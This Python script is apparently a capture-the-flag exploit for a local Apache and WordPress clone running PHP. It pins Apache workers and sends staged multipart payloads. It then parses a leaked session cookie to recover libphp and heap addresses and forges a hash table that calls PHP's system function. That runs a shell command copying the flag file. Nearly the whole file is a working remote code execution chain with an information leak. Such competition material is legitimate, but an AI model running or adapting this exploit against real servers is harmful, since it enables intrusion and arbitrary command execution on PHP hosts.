#!/usr/bin/env python3

import argparse
import hashlib
import json
import socket
import struct
import time
import urllib.parse
from collections import Counter
from pathlib import Path

from payloads import build_a1, build_a2, build_b1, build_b2

HOST = "127.0.0.1"
QUERY = "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
HOLDER_BODY = b"x" * 16384

A1_BYTES = 1060211
A1_SHA256 = "8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6"
B1_BYTES = 33128677
B1_SHA256 = "b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2"
A2_BYTES = 279369
A2_SHA256 = "7af66c8f35c5fa6b47a539da6dca361d19543d9f62d61e4af891c2802bd5e236"

DTOR_OFFSET = 0x65EB60
ZIF_SYSTEM_OFFSET = 0x465370
MAIN_OFFSET = 0xF8398
MAIN_BUCKET_COUNT = 87
DELTA_MIN = 0x1A00000
DELTA_MAX = 0x1F00000


def sha256(data):
    return hashlib.sha256(data).hexdigest()


def info(text):
    print(f"[*] {text}", flush=True)


def good(text):
    print(f"[+] {text}", flush=True)


def save(path, data):
    path.write_bytes(data)


def recv_all(sock, limit=4 << 20):
    out = bytearray()
    try:
        while len(out) < limit:
            block = sock.recv(65536)
            if not block:
                break
            out += block
    except OSError:
        pass
    return bytes(out)


def send_chunked(port, path, body, timeout):
    header = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {HOST}:{port}\r\n"
        "Content-Type: multipart/form-data; boundary=CCCCCCCCCC\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: close\r\n\r\n"
    ).encode()

    sock = socket.create_connection((HOST, port), timeout=timeout)
    sock.settimeout(timeout)
    try:
        try:
            sock.sendall(header)
            for offset in range(0, len(body), 65536):
                block = body[offset:offset + 65536]
                sock.sendall(("%x\r\n" % len(block)).encode())
                sock.sendall(block)
                sock.sendall(b"\r\n")
            sock.sendall(b"0\r\n\r\n")
        except OSError:
            pass
        return recv_all(sock)
    finally:
        sock.close()


def send_plain(port, path, body, timeout):
    header = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {HOST}:{port}\r\n"
        "Content-Type: multipart/form-data; boundary=CCCCCCCCCC\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n\r\n"
    ).encode()

    sock = socket.create_connection((HOST, port), timeout=timeout)
    sock.settimeout(timeout)
    try:
        try:
            sock.sendall(header + body)
        except OSError:
            pass
        return recv_all(sock, 1 << 20)
    finally:
        sock.close()


def warm(port, path):
    sock = socket.create_connection((HOST, port), timeout=15)
    sock.settimeout(15)
    try:
        sock.sendall(f"GET {path} HTTP/1.0\r\nHost: x\r\n\r\n".encode())
        response = recv_all(sock, 2 << 20)
    finally:
        sock.close()
    return response


def hold_workers(port, path, workers):
    if workers <= 1:
        return []

    holders = []
    for index in range(workers - 1):
        try:
            sock = socket.create_connection((HOST, port), timeout=5)
            request = (
                f"POST {path} HTTP/1.1\r\n"
                "Host: 127.0.0.1\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 1048576\r\n\r\n"
            ).encode()
            sock.sendall(request + HOLDER_BODY)
            holders.append(sock)
        except OSError as error:
            info(f"holder {index + 1}/{workers - 1} failed: {error}")
            break
        time.sleep(0.01)

    time.sleep(0.8)
    info(f"pinned {len(holders) + 1}/{workers} Apache workers")
    if len(holders) != workers - 1:
        for sock in holders:
            sock.close()
        raise RuntimeError("could not pin every Apache worker except one")
    return holders


def parse_leak(response):
    marker = b"Set-Cookie: PHPSESSID="
    start = response.find(marker)
    if start < 0:
        raise RuntimeError(f"B1 returned no PHPSESSID cookie ({len(response)} bytes)")

    raw = response[start + len(marker):].split(b"\r\n", 1)[0]
    decoded = urllib.parse.unquote_to_bytes(raw.decode("latin1"))
    counts = Counter()
    for offset in range(0, len(decoded) - 8, 8):
        word = struct.unpack_from("<Q", decoded, offset)[0]
        if 0x700000000000 <= word <= 0x7FFFFFFFFFFF:
            counts[word] += 1
    if not counts:
        raise RuntimeError("B1 cookie contains no canonical x86_64 pointers")

    zval_ptr_dtor, dtor_count = counts.most_common(1)[0]
    libphp = zval_ptr_dtor - DTOR_OFFSET
    buckets = Counter()
    for word, count in counts.items():
        buckets[word & ~0x1FFFFF] += count

    lib_bucket = zval_ptr_dtor & ~0x1FFFFF
    id_bucket = buckets.most_common(1)[0][0]
    candidates = []
    for bucket, count in buckets.most_common():
        if bucket in (lib_bucket, id_bucket):
            continue
        if DELTA_MIN <= libphp - bucket <= DELTA_MAX:
            candidates.append((bucket, count))
    candidates.sort(key=lambda item: (abs(item[1] - MAIN_BUCKET_COUNT), -item[1]))
    if not candidates:
        raise RuntimeError("B1 leak contains no calibrated main-heap candidate")

    return {
        "decoded_bytes": len(decoded),
        "zval_ptr_dtor": zval_ptr_dtor,
        "zval_ptr_dtor_count": dtor_count,
        "libphp": libphp,
        "main_candidates": candidates[:3],
        "top_buckets": buckets.most_common(8),
    }


def checked_payloads():
    a1 = build_a1()
    b1 = build_b1()
    a2 = build_a2()
    checks = (
        ("A1", a1, A1_BYTES, A1_SHA256),
        ("B1", b1, B1_BYTES, B1_SHA256),
        ("A2", a2, A2_BYTES, A2_SHA256),
    )
    for name, body, size, digest in checks:
        if len(body) != size or sha256(body) != digest:
            raise RuntimeError(f"{name} payload changed")
    return a1, b1, a2


def run(args):
    out = args.output_dir
    out.mkdir(parents=True, exist_ok=False)
    if args.proof.exists():
        raise RuntimeError(f"proof path already exists: {args.proof}")

    a1, b1, a2 = checked_payloads()
    journal = {
        "scope": "local Apache 8.4.26 and WordPress 7.0.7 clone",
        "target": f"http://{HOST}:{args.port}{args.path}",
        "workers": args.workers,
        "expected_marker": args.expected_marker,
        "stages": [],
    }

    def note(name, **facts):
        journal["stages"].append({"name": name, **facts})
        (out / "journal.json").write_text(json.dumps(journal, indent=2) + "\n")

    holders = hold_workers(args.port, args.path, args.workers)
    try:
        response = warm(args.port, args.path)
        save(out / "warm.response.bin", response)
        note("warm", response_bytes=len(response), response_sha256=sha256(response))

        info("Apache A1: leaving the stale session ID")
        response = send_chunked(args.port, args.path + QUERY, a1, 180)
        save(out / "a1.response.bin", response)
        note("a1", request_bytes=len(a1), request_sha256=sha256(a1),
             response_bytes=len(response), response_sha256=sha256(response))
        time.sleep(0.2)

        info("Apache B1: leaking libphp and the main heap")
        response = send_chunked(args.port, args.path, b1, args.timeout)
        save(out / "b1.response.bin", response)
        leak = parse_leak(response)
        note(
            "b1",
            request_bytes=len(b1),
            request_sha256=sha256(b1),
            response_bytes=len(response),
            response_sha256=sha256(response),
            decoded_bytes=leak["decoded_bytes"],
            zval_ptr_dtor=hex(leak["zval_ptr_dtor"]),
            zval_ptr_dtor_count=leak["zval_ptr_dtor_count"],
            libphp=hex(leak["libphp"]),
            main_candidates=[[hex(address), count] for address, count in leak["main_candidates"]],
        )
        good(f"libphp: {hex(leak['libphp'])}")

        zif_system = leak["libphp"] + ZIF_SYSTEM_OFFSET
        for attempt, (main, count) in enumerate(leak["main_candidates"], 1):
            address = main + MAIN_OFFSET
            info(f"Apache A2/B2 candidate {attempt}: main={hex(main)}")

            a2_response = send_plain(args.port, args.path, a2, args.timeout)
            save(out / f"a2-{attempt}.response.bin", a2_response)
            time.sleep(0.2)

            b2 = build_b2(address, zif_system, args.command)
            b2_response = send_plain(args.port, args.path, b2, args.timeout)
            save(out / f"b2-{attempt}.response.bin", b2_response)
            time.sleep(0.8)

            proof = args.proof.read_bytes() if args.proof.is_file() else None
            note(
                "a2_b2",
                attempt=attempt,
                main=hex(main),
                main_bucket_count=count,
                fake_hash_table=hex(address),
                zif_system=hex(zif_system),
                a2_request_bytes=len(a2),
                a2_request_sha256=sha256(a2),
                a2_response_bytes=len(a2_response),
                a2_response_sha256=sha256(a2_response),
                b2_request_bytes=len(b2),
                b2_request_sha256=sha256(b2),
                b2_response_bytes=len(b2_response),
                b2_response_sha256=sha256(b2_response),
                proof_bytes=None if proof is None else len(proof),
                proof_sha256=None if proof is None else sha256(proof),
            )

            if proof is not None and args.expected_marker.encode() in proof:
                result = {
                    "success": True,
                    "profile": "apache-wordpress",
                    "flag": args.expected_marker,
                    "libphp": hex(leak["libphp"]),
                    "main": hex(main),
                    "zif_system": hex(zif_system),
                    "proof_sha256": sha256(proof),
                }
                (out / "result.json").write_text(json.dumps(result, indent=2) + "\n")
                note("complete", **result)
                good("Apache B2 copied the local dummy flag")
                print(json.dumps(result, indent=2))
                return result

        raise RuntimeError("every leaked main-heap candidate missed the proof")
    except Exception as error:
        note("abort", error=f"{type(error).__name__}: {error}")
        raise
    finally:
        for sock in holders:
            try:
                sock.close()
            except OSError:
                pass


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--execute", action="store_true")
    parser.add_argument("--port", type=int, default=18234)
    parser.add_argument("--path", default="/wp-includes/version.php")
    parser.add_argument("--workers", type=int, default=150)
    parser.add_argument("--proof", type=Path, default=Path("lab/apache/proofs/local_flag"))
    parser.add_argument("--output-dir", type=Path, default=Path("runs/apache"))
    parser.add_argument("--expected-marker", default="hitcon{local_apache84_dummy_do_not_submit}")
    parser.add_argument("--command", default="cat /flag >/out/local_flag")
    parser.add_argument("--timeout", type=float, default=120)
    args = parser.parse_args()

    if args.path != "/wp-includes/version.php":
        parser.error("the packaged Apache chain is calibrated for /wp-includes/version.php")
    if not 1 <= args.port <= 65535:
        parser.error("bad port")
    if not 1 <= args.workers <= 150:
        parser.error("workers must be between 1 and 150")

    a1, b1, a2 = checked_payloads()
    if not args.execute:
        print(json.dumps({
            "mode": "offline_plan",
            "target": f"http://{HOST}:{args.port}{args.path}",
            "workers": args.workers,
            "a1": {"bytes": len(a1), "sha256": sha256(a1)},
            "b1": {"bytes": len(b1), "sha256": sha256(b1)},
            "a2": {"bytes": len(a2), "sha256": sha256(a2)},
            "live_requests": 0,
        }, indent=2))
        return

    run(args)


if __name__ == "__main__":
    main()
